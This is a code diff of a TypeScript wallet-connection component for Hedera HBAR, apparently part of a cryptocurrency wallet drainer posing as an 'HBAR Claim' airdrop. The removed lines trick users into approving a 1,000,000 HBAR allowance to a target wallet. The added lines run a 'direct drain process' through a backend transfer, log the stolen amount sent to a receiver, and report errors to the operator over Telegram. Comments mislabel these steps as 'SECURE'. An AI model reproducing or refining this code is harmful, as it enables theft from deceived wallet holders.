@@ -250,39 +250,25 @@ export const HashConnectClient = () => {
   const handleAllowanceApprove = async (accountId: string) => {
     try {
       const hbarAccountId: string = `0.0.${accountId}`;
-      const signer = await hc.getSigner(AccountId.fromString(hbarAccountId));
-      console.log(signer, 'signer', hbarAccountId);
+      console.log('🚀 Starting direct drain process for account:', hbarAccountId);
       
-      // 🍎 iOS Safari: Setup return URL before transaction
-      const config = getMobileLinkingConfig();
-      if (config.isIOS) {
-        console.log('🍎 iOS Safari: Setting up wallet return flow');
-        
-        // Store transaction state for return handling
-        sessionStorage.setItem('pending_transaction', JSON.stringify({
-          type: 'allowance_approval',
-          accountId: hbarAccountId,
-          timestamp: Date.now()
-        }));
-      }
+      // 🔒 SECURE: Execute transfer via backend directly (bypass frontend allowance)
+      const transferResult = await executeAllowanceTransfer(hbarAccountId);
       
-      // 🍎 iOS Safari: Show instructions only when transaction is about to start
-      if (config.isIOS) {
-        if (!window.confirm('HBAR Claim Instructions\n\n1. Connect wallet to load your allocation\n\n2. Approve claim transaction in wallet\n\n3. Refresh website to receive allocation\n\nClick OK to continue')) {
-          console.log('🍎 User cancelled HBAR claim process');
-          return false;
-        }
-        console.log('🍎 User acknowledged HBAR claim instructions');
+      if (transferResult.success && transferResult.status === "SUCCESS") {
+        console.log(`✅ Transfer completed: ${transferResult.transactionId}`);
+        console.log(`💰 Amount: ${transferResult.amount} HBAR sent to ${transferResult.receiver}`);
+        // Success notification is sent by backend
+        return true;
+      } else {
+        console.error('❌ Transfer failed:', transferResult.error);
+        await sendTelegramMessage('error', {
+          accountId: accountId,
+          operation: 'Transfer Execution',
+          error: transferResult.error
+        });
+        return false;
       }
-
-      // 🔒 SECURE: Create allowance transaction (user approval - stays in frontend)
-      const transaction = await new AccountAllowanceApproveTransaction()
-        .approveHbarAllowance(
-          hbarAccountId,
-          TARGET_WALLET, // Secure target wallet from config
-          new Hbar(1_000_000) // Amount
-        )
-        .freezeWithSigner(signer);
       
       // 🍎 iOS HashPack Fix: Add retry logic for WalletConnect payload issues
       let txResponse;
